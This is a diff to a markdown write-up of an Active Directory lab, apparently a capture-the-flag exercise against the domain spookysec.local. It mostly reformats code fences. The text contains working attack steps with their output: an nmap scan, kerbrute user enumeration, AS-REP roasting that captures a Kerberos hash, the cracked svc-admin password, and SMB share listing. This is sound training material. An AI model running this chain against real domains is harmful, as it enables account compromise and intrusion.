@@ -1,7 +1,8 @@
 
 # nmap -sVC 10.10.96.84 -T4
 
-```Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 17:47 EET
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 17:47 EET
 sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.96.84, 16) => Operation not permitted
 Offending packet: TCP 10.2.92.176:64370 > 10.10.96.84:53 S ttl=38 id=49382 iplen=44  seq=1945375481 win=1024 <mss 1460>
 sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.96.84, 16) => Operation not permitted
@@ -33,7 +34,7 @@ Nmap done: 1 IP address (1 host up) scanned in 56.30 seconds
 
 # AD Users Enumeration 
   ./kerbrute userenum -d spookysec.local --dc 10.10.246.162 userlist.txt 
-  
+ ``` 
 james@spookysec.local
 svc-admin@spookysec.local
 robin@spookysec.local
@@ -41,20 +42,20 @@ darkstar@spookysec.local
 administrator@spookysec.local
 backup@spookysec.local
 paradox@spookysec.local 
-
+```
 
 # AS-REP ROASTING 
    python3 GetNPUsers.py spookysec.local/ -userfile users.txt -no-pass -dc-ip 10.10.246.162
-   
+ ```  
 [-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set  
 [*] Getting TGT for svc-admin
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9e9d37205ca2b017be8b60ae4decc7d8$4d81d588e53cd91588752a3d06537c32d95b9e71c8ad9000bfb2442ae8fdd36a7448fca372decebd0d6ef2a0020b5eea2d690503018447cbd9422ff59fe0aa62777c8840112179b56a1971f083ca17ef83a29d4815f86c3c5836420de128f7c9d6975bd367c02b2f22ce506b61ce0ebaa2a664b59fa40a7fa1d04db8654d62c3f09c803025e270ef112a2f833b4e2d8bc1fe756d58fa734277b25b77e521e57a7a77dc19d517a692704f5c68a5593f552bacc82202f44fecf34ddf36f97ed54d65432eef3739fad5b9ce14fbf81b306503b0191dd3eda6ed3e7ade34bb37cc1b3ee16b240369df8fb7cb79d367bee2c66b2c
 [-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set  
 [-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set  
 [-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set  
-
+```
 # John Hash.txt
-  svc-admin:management2005
+```  svc-admin:management2005```
 
 # smbclient -L //10.10.83.246 -U 'svc-admin' 
 	Sharename       Type      Comment
